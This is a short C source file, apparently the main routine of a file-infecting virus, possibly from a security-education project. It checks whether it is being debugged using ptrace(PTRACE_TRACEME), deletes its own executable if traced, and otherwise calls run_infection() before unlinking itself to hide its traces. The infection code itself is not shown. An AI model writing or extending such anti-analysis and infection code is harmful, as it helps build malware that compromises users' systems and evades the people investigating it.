#include "famine_bonus.h"
int main()
{
    char path[4096];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len == -1)
    {
        //perror("readlink failed");
        return 1;
    }
    if (ptrace(PTRACE_TRACEME, 0, NULL, 0) == -1)
    {
        unlink(path);
        return 0;
    }
    path[len] = '\0';
    run_infection();
    unlink(path);
    return 0;
}
